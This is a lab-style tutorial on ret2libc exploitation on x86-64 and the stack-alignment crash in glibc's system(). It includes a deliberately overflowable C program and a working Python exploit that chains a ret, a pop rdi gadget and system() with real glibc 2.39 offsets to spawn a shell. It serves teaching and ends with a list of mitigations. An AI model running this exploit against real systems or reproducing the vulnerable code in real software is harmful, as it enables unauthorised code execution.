ret2libc & the Stack Alignment Trap

Your chain is perfect, rdi points at "/bin/sh", and the process still dies — inside system(), on a movaps. One extra ret gadget fixes it. This page explains why, with the arithmetic and a working demo.

1 Why ret2libc exists NX killed shellcode, not control flow

A stack overflow gives you one thing: the saved return address. In the 1990s you filled the buffer with shellcode and returned into the buffer. Then every OS marked the stack non-executable (NX / DEP, visible as GNU_STACK RW in readelf -lW), and that payload stopped working — the bytes are still there, the CPU just refuses to execute them.

Nothing stops you from returning into code that is already executable. libc is mapped into every process and contains, among 2000+ functions, system(). So you stop supplying code and start supplying addresses: this is return-oriented programming, and ret2libc is its smallest useful instance.

NX removes your ability to introduce code. It does not remove your ability to re-order code that already exists.
The moment you reuse real compiled functions, you inherit their assumptions. A function compiled by GCC assumes the System V ABI was honoured on entry. Your ROP chain is the caller now — and it is a sloppy one. Stack misalignment is the first ABI contract people break.

2 The 64-bit chain arguments are registers, so you need gadgets

On 32-bit x86 the arguments of a cdecl function sit on the stack, so a ret2libc payload is just three words: &system, a fake return address, &"/bin/sh". On x86-64 the first six integer arguments live in rdi, rsi, rdx, rcx, r8, r9 — the stack carries none of them. You cannot set a register by writing on the stack; you need an instruction that moves stack data into a register and then returns. That is a gadget:

pop rdi        ; 5f    ← takes the next qword off your payload into rdi
ret            ; c3    ← and continues to the next entry of your payload
Padding to the saved RIP is sizeof(buf) + 8 = 72 here, because buf sits at rbp-0x40 and the saved RBP is in between. The chain itself is four qwords.

3 The ABI rule that bites rsp + 8 must be a multiple of 16

The System V AMD64 ABI says the stack must be 16-byte aligned immediately before a call. Since call pushes an 8-byte return address, the function sees:

At every function entry point: (rsp + 8) % 16 == 0, i.e. rsp % 16 == 8. The prologue’s pushes and sub are sized by the compiler on that assumption, so that every 16-byte local — every xmm spill slot — lands on a 16-byte boundary.

Why does any of this matter? Because of one instruction family. movaps/movdqa ("aligned packed single") requires its memory operand to be 16-byte aligned; a misaligned operand raises #GP, which the kernel delivers as SIGSEGV. The unaligned sibling movups would have been fine — but GCC emits the aligned form precisely because the ABI promised alignment.

InstructionAlignment requirementWhere you meet it
movaps / movapd / movdqa16 bytes, enforced → #GP → SIGSEGVsystem(), printf() float paths, memcpy variants, _dl_runtime_resolve
movups / movdqunonewhat the compiler uses when it cannot prove alignment
vmovaps (AVX, ymm)32 bytesAVX-optimised string functions
The CPU does not care about rsp as such. It cares that the effective address [rsp+0x50] is a multiple of 16. rsp only matters because it is the base of every stack slot the function computed.

4 Inside do_system the arithmetic, from a real libc

system() on glibc is a thin wrapper: it rejects a NULL command and jumps to the real worker, do_system. Here is the local libc (Ubuntu 24.04, glibc 2.39), straight out of objdump:

$ objdump -d --no-show-raw-insn /usr/lib/x86_64-linux-gnu/libc.so.6

0000000000058750 <__libc_system>:
   58750:  endbr64
   58754:  test   %rdi,%rdi
   58757:  je     58760
   58759:  jmp    582d0            <-- tail jump: rsp unchanged, alignment inherited

00000000000582d0 <do_system>:
   582d0:  push   %r13             <-- 4 pushes = -0x20  (0x20 % 16 == 0)
   582d2:  mov    $0x1,%edx
   582d7:  push   %r12
   582dc:  push   %rbp
   582dd:  push   %rbx
   582de:  sub    $0x388,%rsp      <-- 0x388 % 16 == 8   <<< the odd one
   ...
   5843b:  movaps %xmm0,0x50(%rsp) <-- 0x50 % 16 == 0, so this inherits rsp's alignment

Three numbers decide everything: 0x20 (neutral), 0x388 (shifts by 8), 0x50 (neutral). So the effective address of that movaps is congruent to rsp_on_entry − 8 mod 16. It is aligned only if system was entered with rsp % 16 == 8 — exactly what the ABI promises and exactly what a naive ROP chain gets wrong.

5 The one-qword fix and why it is a ret and not a nop

You need to shift rsp by 8 somewhere before system begins. Any gadget that consumes one extra qword will do, but a bare ret is the ideal one: it is one byte (c3), it exists in every binary and every library, it touches no register, and it costs exactly one slot in your payload.

GadgetEffect on rspSide effects
ret+8 per usenone — the clean choice
pop rax ; ret (any unused reg)+8clobbers that register; eats a payload qword as data
add rsp, 8 ; ret+8none; also eats a qword
nop ; ret0useless — a nop does not move rsp. Alignment is about rsp, not about time.
Parity, not position. One extra ret anywhere before the call flips the chain from wrong to right; two extra rets put you back where you started. If the payload already happens to be aligned, adding one breaks it. The rule is “make rsp % 16 == 8 at the entry of the libc function”, not “always add a ret”.
Finding one: ropper --file ./vuln --search "ret", ROPgadget --binary ./vuln --only "ret", or by hand — any c3 byte inside an executable segment. Gadgets are byte patterns, not instructions the compiler emitted, so c3 in the middle of a longer instruction works just as well. A linear objdump will not show you those.

6 Lab reproduced on glibc 2.39, both outcomes

The target NX on, canary off, non-PIE, leak handed to you

// vuln.c — gcc -fno-stack-protector -no-pie -O0 -o vuln vuln.c
#include <stdio.h>
#include <dlfcn.h>
#include <unistd.h>

char cmd[] = "/bin/sh";

void vuln(void) { char buf[64]; read(0, buf, 512); }        // 512 into 64

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    printf("system=%p  binsh=%p\n", dlsym(RTLD_DEFAULT, "system"), (void *)cmd);
    vuln();
    return 0;
}
The program prints the runtime address of system so that ASLR is out of the picture — this page is about alignment, not about leaking. In a real target that line is your info-leak primitive, and everything below is unchanged.

The exploit one flag switches the alignment

#!/usr/bin/env python3
import re, struct, subprocess, sys, time

ALIGN = (len(sys.argv) < 2) or (sys.argv[1] == "align")

SYSTEM_OFF  = 0x58750    # __libc_system   | glibc 2.39, Ubuntu 24.04
POP_RDI_OFF = 0x10c08d   # pop rdi ; ret   | byte pattern 5f c3
RET_OFF     = 0x28a92    # ret             | byte pattern c3

p = subprocess.Popen(["./vuln"], stdin=subprocess.PIPE,
                     stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
m = re.search(r"system=(0x[0-9a-f]+)\s+binsh=(0x[0-9a-f]+)",
              p.stdout.readline().decode())
system, binsh = int(m.group(1), 16), int(m.group(2), 16)
base = system - SYSTEM_OFF

q = lambda v: struct.pack("<Q", v)
chain  = q(base + RET_OFF) if ALIGN else b""     # <-- the whole lesson
chain += q(base + POP_RDI_OFF) + q(binsh) + q(system)

p.stdin.write(b"A" * 72 + chain + b"\n"); p.stdin.flush()
time.sleep(0.3)                                  # let the shell come up
p.stdin.write(b"id; echo SHELL_OK\n");  p.stdin.flush()
print(p.communicate(timeout=5)[0].decode())

  (no output)   rc = -11   → SIGSEGV

$ gdb -q -batch -ex "run < pay_noalign" -ex "info registers rsp" -ex "x/i \$rip" ./vuln
 #0  0x7ffff7c5843b → do_system(line=0x404030 <cmd> "/bin/sh")   ← rdi was perfect!
 reason: SIGSEGV
 rsp            0x7fffffffd318
=> 0x7ffff7c5843b <do_system+363>:  movaps XMMWORD PTR [rsp+0x50],xmm0
0x7fffffffd318 — the low nibble is 8, so rsp % 16 == 8 and [rsp+0x50] % 16 == 8. Exactly the prediction from section 4. Note that gdb even printed the argument correctly: the chain worked, the ABI did not.

Aligned run same payload, one qword longer

$ gdb -q -batch -ex "run < pay_align" ./vuln

$ python3 exp.py align

The parent still reports rc = -11 afterwards, and that is expected: once the shell exits, system() returns into whatever follows your chain — here, into 'A' padding. Append &exit (or a pop rdi; ret + 0 + &exit) if you want a clean teardown.

Why this is a 64-bit-only rite of passage. On 32-bit the classic three-word ret2libc passes arguments on the stack and glibc’s 32-bit system rarely touches aligned SSE stores, so a misaligned chain usually just works. Move to x86-64 and the same payload shape suddenly needs gadgets and parity — which is why “add a ret” is folklore in every ROP Emporium writeup.
What actually stops ret2libc (alignment is not a mitigation): ASLR + no info leak; full RELRO against GOT overwrites; stack canaries against the overflow itself; and Intel CET — shadow stacks make a forged return address detectable, and IBT requires endbr64 at indirect targets. The endbr64 at 58750 in the listing above is CET groundwork already shipping in your libc.
